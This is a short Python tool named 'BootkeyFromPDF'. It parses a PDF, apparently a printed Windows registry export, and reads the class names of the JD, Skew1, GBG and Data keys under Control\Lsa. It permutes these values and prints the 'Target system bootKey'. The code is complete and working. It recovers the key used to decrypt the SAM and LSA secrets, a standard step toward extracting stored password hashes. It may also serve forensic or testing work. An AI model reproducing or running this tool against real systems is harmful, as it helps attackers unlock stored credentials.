import pdfplumber
import re
from binascii import unhexlify, hexlify
import argparse

ascii_art = r"""

 ____              _   _              _____                    ____  ____  _____ 
| __ )  ___   ___ | |_| | _____ _   _|  ___| __ ___  _ __ ___ |  _ \|  _ \|  ___|
|  _ \ / _ \ / _ \| __| |/ / _ \ | | | |_ | '__/ _ \| '_ ` _ \| |_) | | | | |_   
| |_) | (_) | (_) | |_|   <  __/ |_| |  _|| | | (_) | | | | | |  __/| |_| |  _|  
|____/ \___/ \___/ \__|_|\_\___|\__, |_|  |_|  \___/|_| |_| |_|_|   |____/|_|    
                                |___/                                            

"""


def ExtractKey(pdf_path):
    key_name_pattern = re.compile(r'Key Name:\s*(.+)')
    class_name_pattern = re.compile(r'Class Name:\s*(.+)')
    sequences = []

    with pdfplumber.open(pdf_path) as pdf:
        for page in pdf.pages:
            text = page.extract_text()
            if text:
                lines = text.split('\n')
                for i in range(len(lines) - 1):
                    key_match = key_name_pattern.match(lines[i])
                    class_match = class_name_pattern.match(lines[i + 1])
                    if key_match and class_match:
                        sequences.append((key_match.group(1), class_match.group(1)))

    return sequences

def GetBootkey(sequences, keys):
    tmpKey = ''
    for key in keys:
        for key_name, class_name in sequences:
            if key_name.endswith(f"\\Control\\Lsa\\{key}"):
                digit = class_name.encode('utf-16le')[:16].decode('utf-16le')
                print(f"[*] {key_name} : {digit}")
                tmpKey += digit

    transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
    tmpKey = unhexlify(tmpKey)

    bootKey = b''
    for i in range(len(tmpKey)):
        bootKey += tmpKey[transforms[i]:transforms[i] + 1]

    return bootKey



def main(path):
    print(ascii_art)
    keys = ["JD", "Skew1", "GBG", "Data"]
    sequences = ExtractKey(path)
    bootKey = GetBootkey(sequences, keys)
    print(f"[+] Target system bootKey: {hexlify(bootKey).decode('utf-8')}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Calculate bootkey from PDF.")
    parser.add_argument("--path",required=True, help="Path to the PDF file")
    args = parser.parse_args()
    main(args.path)
